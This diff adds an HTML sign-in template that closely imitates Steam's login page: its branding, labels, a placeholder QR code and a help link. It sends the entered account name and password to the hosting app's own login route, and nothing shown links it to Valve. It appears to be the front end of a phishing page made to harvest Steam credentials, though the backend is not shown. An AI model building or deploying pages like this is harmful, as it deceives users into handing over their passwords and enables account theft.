@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam - Sign In</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: "Motiva Sans", sans-serif, Arial, Helvetica;
+            background: #0d141d;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 16px;
+        }
+        .steam-container {
+            width: 100%;
+            max-width: 700px;
+            background: linear-gradient(135deg, #182330 0%, #0d141d 100%);
+            border-radius: 4px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+        }
+        .steam-header { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
+        .steam-title { font-size: 28px; font-weight: 200; letter-spacing: 2px; text-transform: uppercase; }
+        .steam-grid {
+            display: grid;
+            grid-template-columns: 1fr 220px;
+            gap: 40px;
+        }
+        @media (max-width: 600px) { .steam-grid { grid-template-columns: 1fr; } }
+        .steam-form { display: flex; flex-direction: column; gap: 16px; }
+        .steam-label { font-size: 12px; font-weight: 600; color: #1999ff; text-transform: uppercase; letter-spacing: 1px; }
+        .steam-input {
+            width: 100%;
+            height: 40px;
+            background: #25282e;
+            border: 1px solid #000;
+            border-radius: 2px;
+            padding: 0 12px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
+        }
+        .steam-input:focus { border-color: #66c0f4; }
+        .steam-btn {
+            width: 100%;
+            height: 48px;
+            background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%);
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: filter 0.2s;
+        }
+        .steam-btn:hover { filter: brightness(1.2); }
+        .steam-qr-box {
+            background: rgba(0,0,0,0.2);
+            border-radius: 4px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            border: 1px solid #1a222c;
+        }
+        .steam-qr-img { width: 140px; height: 140px; background: #fff; border-radius: 4px; margin: 12px 0; padding: 8px; }
+        .steam-qr-text { font-size: 12px; color: #8f98a0; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <div class="steam-container">
+        <div class="steam-header">
+            <h1 class="steam-title">Sign In</h1>
+        </div>
+
+        <div class="steam-grid">
+            <form class="steam-form" action="{{ url_for('login') }}" method="POST">
+                <div>
+                    <label class="steam-label">Sign in with account name</label>
+                    <input type="text" name="username" class="steam-input" style="margin-top: 6px;" required />
+                </div>
+
+                <div>
+                    <label class="steam-label">Password</label>
+                    <input type="password" name="password" class="steam-input" style="margin-top: 6px;" required />
+                </div>
+
+                <button type="submit" class="steam-btn">Sign In</button>
+                <a href="#" style="color: #c6d4df; font-size: 12px; text-decoration: none; margin-top: 8px;">Help, I can't sign in</a>
+            </form>
+
+            <div class="steam-qr-box">
+                <span class="steam-label">Or sign in with QR</span>
+                <div class="steam-qr-img">
+                    <svg viewBox="0 0 100 100" width="100%" height="100%"><path fill="#000" d="M0 0h40v40H0zm10 10v20h20V10zm50-10h40v40H60zm10 10v20h20V10zM0 60h40v40H0zm10 10v20h20V70zm50 20h10v10H60zm20 0h20v10H80zm-10-20h10v10H70zm20 0h10v10H90z"/></svg>
+                </div>
+                <p class="steam-qr-text">Use the Steam Mobile App to sign in via QR code</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
